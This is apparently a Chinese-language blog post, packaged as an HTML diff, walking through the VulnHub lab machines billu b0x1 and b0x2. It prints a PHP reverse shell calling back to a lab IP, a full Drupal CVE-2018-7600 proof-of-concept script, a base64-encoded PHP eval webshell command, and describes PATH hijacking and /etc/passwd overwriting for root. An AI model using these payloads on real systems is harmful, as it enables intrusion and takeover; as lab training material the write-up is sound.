@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Xi4nb3i" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      【vlunhub】BILLU:B0X1+2 
+      
+      
+    
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.svg">
+    <link rel="icon" href="/images/favicon.svg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto:400,400italic,600|Roboto+Mono" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/common.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+
+
+  
+
+  
+    
+<link rel="stylesheet" href="/css/post.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Xi4nb3i's blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <a href="/">Xi4nb3i</a>
+</div>
+
+
+      <p class="links">
+  
+    <a title="archives" target="" href="/archives/">
+      <i class="iconfont icon-bookmark"></i>
+    </a>
+  
+    <a title="github" target="_blank" href="https://github.com/xianbeil">
+      <i class="iconfont icon-github"></i>
+    </a>
+  
+</p>
+
+
+      <div class="main">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    }
+  };
+</script>
+
+<div class="post">
+  <h3 class="date">
+    Aug 30, 2022
+  </h3>
+  <h1>
+    【vlunhub】BILLU:B0X1+2
+  </h1>
+  <div class="content markdown-body">
+    <blockquote>
+<p>个人测评：</p>
+<p>趣味：2星+1星（one piece）</p>
+<p>难度：3星</p>
+<p>技巧：3星</p>
+</blockquote>
+<p>两个靶机，分别玩一下，感觉年份都有点老了</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830015404-550uhj8.png" alt="image">​</p>
+<h1 id="billu-b0x1"><a href="#billu-b0x1" class="headerlink" title="billu b0x1"></a>billu b0x1</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>17年发布的靶机，先信息搜集一波</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829222057-pabm7fw.png" alt="image">​</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829222328-bp2qbfd.png" alt="image">​</p>
+<p>进行简单的目录扫描</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830001328-rzyl9zr.png" alt="image">​</p>
+<p>其中我们能看到一个phpmyadmin的后台，一个phpinfo页面</p>
+<h2 id="sql注入到getshell"><a href="#sql注入到getshell" class="headerlink" title="sql注入到getshell"></a>sql注入到getshell</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829232551-pu3g6a1.png" alt="image">​</p>
+<p>成功登陆进去，后面用\将单引号转义后成为注释</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829234953-7d657d8.png" alt="image">​</p>
+<p>随后是一个上传的页面</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829235146-gdbmnyk.png" alt="image">​</p>
+<p>这里的上传点对后缀进行了白名单校验</p>
+<p>所以上传shell比较局限</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830001441-a0dki7f.png" alt="image">​</p>
+<p>发现这里load参数后面跟的好像是add.php</p>
+<p>果然有个文件包含</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830001523-1q07m92.png" alt="image">​</p>
+<p>也是能成功包含到上传上去的jpg来rce</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830001649-bzont35.png" alt="image">​</p>
+<p>如何反弹shell</p>
+<p>经过一些尝试，用<code>proc_open</code>拿到了相对持久的终端</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.56.102&quot;</span>,<span class="number">4445</span>);<span class="variable">$proc</span>=<span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$sock</span>, <span class="number">1</span>=&gt;<span class="variable">$sock</span>, <span class="number">2</span>=&gt;<span class="variable">$sock</span>),<span class="variable">$pipes</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830003449-9rn7gc6.png" alt="image">​</p>
+<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>其实刚刚我们可以看到有个叫做ica的用户</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830003507-53sc4j8.png" alt="image">​</p>
+<p>网站目录里面找数据库密码</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830004023-v01orxu.png" alt="image">​</p>
+<p>当然可以看到他都没有设置端口，这个phpmyadmin貌似看起来不能用</p>
+<p>当前目录下面也有一个c.php，里面也有个密码</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830004518-unrz237.png" alt="image">​</p>
+<p>billu b0x_billu</p>
+<p>没想到用这个密码就能登陆进去</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830014041-uy15j57.png" alt="image">​</p>
+<p>上面的root roottoor也能直接用ssh连上</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830014857-ssfct9s.png" alt="image">​</p>
+<p>即便不使用刚刚的包含漏洞，这里我们也能获取到这两个密码，网站目录下有个test.php也能任意文件读取</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830020826-mwxgf6z.png" alt="image">​</p>
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>最简单粗暴的方法</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830011454-ps3jbkk.png" alt="image">​</p>
+<p>直接放到目标机器上编译运行即可</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830011835-0du9aup.png" alt="image">​</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830012002-bplogqg.png" alt="image">​</p>
+<h1 id="billu-b0x2"><a href="#billu-b0x2" class="headerlink" title="billu b0x2"></a>billu b0x2</h1><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830020932-f4ixvme.png" alt="image">​</p>
+<p>这个靶机明显比一代复杂得多，分别再看每个端口都开了什么服务</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830021159-f9xefrd.png" alt="image">​</p>
+<p>80端口的服务，使用的是<a target="_blank" rel="noopener" href="https://www.drupal.org/">Drupal</a>8搭建的</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830021347-resmcam.png" alt="image">​</p>
+<p>在扫描路径的过程中，我获得了这个drupal的详细版本号8.3.5</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830022836-3o56v0z.png" alt="image">​</p>
+<p>在kali自带的exploitdb中，也发现了很多能在这个版本上用的exp，随便挑了一个，测试成功</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;################################################################&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;# Proof-Of-Concept for CVE-2018-7600&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;# by Vitalii Rudnykh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;# https://github.com/a2u/CVE-2018-7600&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;################################################################&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;Provided only for educational or information purposes\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="built_in">input</span>(<span class="string">&#x27;Enter target url (example: https://domain.ltd/): &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add proxy support (eg. BURP to analyze HTTP(s) traffic)</span></span><br><span class="line"><span class="comment"># set verify = False if your proxy certificate is self signed</span></span><br><span class="line"><span class="comment"># remember to set proxies both for http and https</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># example:</span></span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;, &#x27;https&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line"><span class="comment"># verify = False</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line">verify = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;form_id&#x27;</span>: <span class="string">&#x27;user_register_form&#x27;</span>, <span class="string">&#x27;_drupal_ajax&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;mail[#post_render][]&#x27;</span>: <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;mail[#type]&#x27;</span>: <span class="string">&#x27;markup&#x27;</span>, <span class="string">&#x27;mail[#markup]&#x27;</span>: <span class="string">&#x27;echo &quot;;-)&quot; | tee hello.txt&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, proxies=proxies, data=payload, verify=verify)</span><br><span class="line">check = requests.get(target + <span class="string">&#x27;hello.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> check.status_code != <span class="number">200</span>:</span><br><span class="line">  sys.exit(<span class="string">&quot;Not exploitable&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;\nCheck: &#x27;</span>+target+<span class="string">&#x27;hello.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>写入webshell先，直接echo会转义</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ | base64 --decode` | tee fuck.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接，反弹shell，升级shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830025433-m3p7bfa.png" alt="image">​</p>
+<p>算是先拿到一个基础的权限</p>
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>&#x2F;opt&#x2F;s</p>
+<p>简单查看一下可阅读的部分</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830032456-q85f1q1.png" alt="image">​</p>
+<p>它会调用scp这个命令</p>
+<p>更改环境变量，让他找scp命令时先找到tmp目录下面我们建立的恶意的scp</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830033046-s7ckisf.png" alt="image">‘</p>
+<p>把tmp加到$PATH最前面</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830032825-kfpsolu.png" alt="image">​</p>
+<p>即可提权成功</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830033306-jcw7p8p.png" alt="image">​</p>
+<h2 id="替换-x2F-etc-x2F-passwd"><a href="#替换-x2F-etc-x2F-passwd" class="headerlink" title="替换&#x2F;etc&#x2F;passwd"></a>替换&#x2F;etc&#x2F;passwd</h2><p>之后，我找了老外对这个第二个靶机的文章学习，因为我觉得应该还有别的出路</p>
+<p>之前我也注意到&#x2F;etc&#x2F;passwd里面奇怪的哈希，但没注意到他的权限</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830033926-d6u65gp.png" alt="image">​</p>
+<p>也能注意到indishell这个用户，他甚至给出了加密后的密码</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830034032-mgvoqir.png" alt="image">​</p>
+<p>用openssl生成密码</p>
+<p>用infosec做为salt并也是密码，得到生成的密码，替换掉&#x2F;etc&#x2F;passwd里面的密码</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830034301-ovnr63l.png" alt="image">​</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830034348-n4m1r2s.png" alt="image">​</p>
+<p>我们就能替换掉indishell的密码，并且获取root权限</p>
+<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830034501-8u1dpk1.png" alt="image">​</p>
+
+  </div>
+  
+    
+      <a id="older" class="blog-nav" href="/2022/08/29/20220829vulnhubhacksudo-Thor/">OLDER&nbsp;&gt;</a>
+      
+        
+          <a id="newer" class="blog-nav" href="/2022/09/11/20220911vue%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80/">&lt;&nbsp;NEWER</a>
+          
+            
+</div>
+        <div class="footer">
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Copyright © Leedom 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Theme by Leedom | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+
+
+    </div>
+  </body>
+</html>
